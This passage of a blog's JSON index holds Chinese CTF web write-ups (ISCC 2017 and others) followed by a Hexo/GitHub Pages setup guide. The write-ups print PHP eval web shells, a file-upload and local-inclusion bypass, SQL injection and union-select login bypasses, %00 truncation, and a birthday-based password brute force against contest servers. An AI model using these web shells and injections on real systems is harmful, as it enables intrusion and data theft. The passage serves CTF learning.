type=\"button\"/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY='ISecer:www.isecer.com'; ?&gt; 然而这题有一个坑点，变量$KEY是定义在代码的末尾的。因此在前面将反序列化之后的$cookie与$KEY相比较时，$KEY的值是为NULL的。所以我们要传入的$cookie应该是serialize(&quot;&quot;); 因此，添加Cookie: ISecer=s:0:&quot;&quot;;即可拿到flag。 文件包含2本来以为一发php://filter入魂。没想到”NAIVE”了。F12提示upload.php。上传一个带php一句话的jpg，利用file参数本地包含，发现php标签被过滤成了下划线。尝试 1&lt;script language=\"php\"&gt;@eval($_POST['a']);var_dump(1);&lt;/script&gt; 成功显示int(1),菜刀连接即可看到flag文件。 wordpress查看SUN的文章，可发现一个生日。构造字典爆破得用户名为SUN,密码为sun19980321。登录后有一篇私人日志,大佬提示之后才知道是数据库的帐号密码。。。 wp wzTrzYRdbrbyjAx BTW.由于题目环境被破坏，无法复现截图:( 访问/phpmyadmin。登录之后可看到flag表，拿到flag。","tags":[{"name":"writeup","slug":"writeup","permalink":"K4ngx.github.io/tags/writeup/"}]},{"title":"ISCC_2017_Web_writeup","date":"2017-05-25T03:55:54.000Z","path":"2017/05/25/ISCC-2017-Web-writeup/","text":"Web签到题，来和我换flag啊！POST提交三个f1ag，可在response中拿到flag。 WelcomeToMySQLF12发现数据库信息在../base.php。上传php5 123&lt;?phpshow_source(\"../base.php\");?&gt; 访问upload/xxx.php可拿到base.php源码。再上传一个php5连接数据库可拿到flag。 123456&lt;?php$conn = mysql_connect(\"localhost\", \"iscc2017\", \"iscc2017\");mysql_select_db(\"flag\",$conn);$result = mysql_query(\"select * from flag\");var_dump(mysql_fetch_row($result));?&gt; where is your flag访问flag.php发现hint:thisisflag。可知在表flag中有字段名为thisisflag。尝试GET请求id=1，页面返回正常;请求id=2-1，返回空白页面，可猜测，sql语句为 1SELECT * FROM foobar where id='$_GET['id']' 测试可知为宽字节注入,且需要转换编码为gbk: 我们一起来日站尝试访问robots.txt,发现Disallow: /21232f297a57a5a743894a0e4a801fc3/，提示keep finding admin page，访问/admin.php进入后台登录界面。简单注入：username为admin，passwd为&#39;or 1#拿到flag。 自相矛盾F12拿到部分源码 123456789101112131415161718192021222324252627282930313233$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['iscc']); if(is_array($a))&#123; is_numeric(@$a[\"bar1\"])?die(\"nope\"):NULL; if(@$a[\"bar1\"])&#123; ($a[\"bar1\"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a[\"bar2\"]))&#123; if(count($a[\"bar2\"])!==5 OR !is_array($a[\"bar2\"][0])) die(\"nope\"); $pos = array_search(\"nudt\", $a[\"bar2\"]); $pos===false?die(\"nope\"):NULL; foreach($a[\"bar2\"] as $key=&gt;$val)&#123; $val===\"nudt\"?die(\"nope\"):NULL; &#125; $v2=1; &#125; &#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(\"3|1|c\",$d.$c[0])?die(\"nope\"):NULL; strpos(($c[0].$d), \"isccctf2017\")?$v3=1:NULL; &#125; &#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; echo $flag;&#125; 其中$v2中的array_search()绕过参考了某个大佬的博客：array_search()绕过。$v3中正则的绕过采用%00截断。 Simple sqli验证码要求md5加密后前三位等于一个随机字符串，于是可以写个脚本爆破出符合要求的验证码： 123456789#python3.6import hashlibsub = \"随机字符串\"for i in range(100000): if hashlib.md5(str(i).encode('utf8')).hexdigest().startswith(sub): print(i) break 测试发现，当Username为admin和&#39; or 1#时显示password error. 输入不存在的Username或者sql语法错误时显示username error. 输入&#39;union select 1亦显示password error. 可以猜测sql语句为： 1SELECT password FROM foobar WHERE username='' 然后将查询结果与用户输入的md5加密后的password进行比较。 于是可以令Username=&#39; union select md5(1)#,Password=1,即可拿到Flag。 I have a jpg,i upload a txt.题目过滤了php标签和script标签。当传入$do=rename时，调用了一个KaIsA()函数，测试后发现大写字母为ascii+6，小写为ascii-6，函数代码如下： 12345678910111213141516171819#python3.6a = 'base64加密后的字符串'b = ''for i in a: if i.isupper(): i = ord(i)+6 if i&gt;90: i = chr(i-26) else: i = chr(i) elif i.islower(): i = ord(i)-6 if i&lt;97: i = chr(i+26) else: i = chr(i) b += i print(b) 观察源码发现，rename过程中新生成的随机文件名的txt是唯一的，因此可以尝试上传两个使用php短标签的文件，拼成一个txt文件，再更改后缀为php。 上传的两个文件分别为： 123&lt; //1.txt? eval($_GET['a']); ?&gt; //2.txt 经过两次的rename过程，可以得到一个随机文件名的php，访问upload/xxxxxx.php会跳转到flaggalf.php，抓包可得flag","tags":[{"name":"writeup","slug":"writeup","permalink":"K4ngx.github.io/tags/writeup/"}]},{"title":"用Hexo和Github搭建blog","date":"2017-05-14T15:14:33.000Z","path":"2017/05/14/hexo/","text":"这两天花了点时间在Ubuntu16.04的服务器上用Hexo的框架搭了个blog。总的来说，搭建的速度还是非常快的。然而过程中还是遇到了不少的坑，在此记录一下。 Git 、Node.js和Hexo的安装Git的安装不用多说，一条命令就OK。 1$ sudo apt-get install git-core 而Node.js要使用nvm来安装，Hexo官方教程给了两条命令。 12$ curl https://raw.github.com/creationix/nvm/master/install.sh | sh$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh 第一条命令尝试了几次发现都失败了，而第二条命令成功了，然而这不是重点。重点是在nvm安装成功之后在输入nvm命令时却显示 1zsh: command not found: nvm 在多次搜索后,发现要在~/.zshrc(bash是~/.bashrc)里添上 1[ -s $HOME/.nvm/nvm.sh ] &amp;&amp; . $HOME/.nvm/nvm.sh 然后就可以安装Node.js了 1$ nvm install stable Git和Node.js安装完后，就可以安装Hexo了 1$ npm install -g hexo-cli hexo d命令报错在使用hexo d命令时，可能会遇到ERROR Deployer not found: git的错误，输入以下代码即可 1$ npm install hexo-deployer-git --save 域名的绑定由于是利用github来搭建的静态网站，刚搭建好博客时，需要通过github的域名来访问。然而，当然是用自己的域名来访问更爽一点。 域名提供商首先要在域名提供商（我这里是腾讯云）那边添加一条CNAME记录，将CNAME指向your_username.github.io 在博客里添加CNAME文件进入博客目录，在source文件夹下创建一个名为CNAME的文件，输入你的域名: 如 blog.cnt2x.cn 坑！Github的Custom domain设置这个地方折磨了我挺久，上面两个步骤设置完了之后，我访问我的博客永远都是404，找了好久的问题。后来在某篇文章中发现，在Github里仓库的setting，在下方有一个Custom domain的设置，输入你要绑定的域名，然后save，就可以进入博客了。","tags":[{"name":"hexo","slug":"hexo","permalink":"K4ngx.github.io/tags/hexo/"}]}]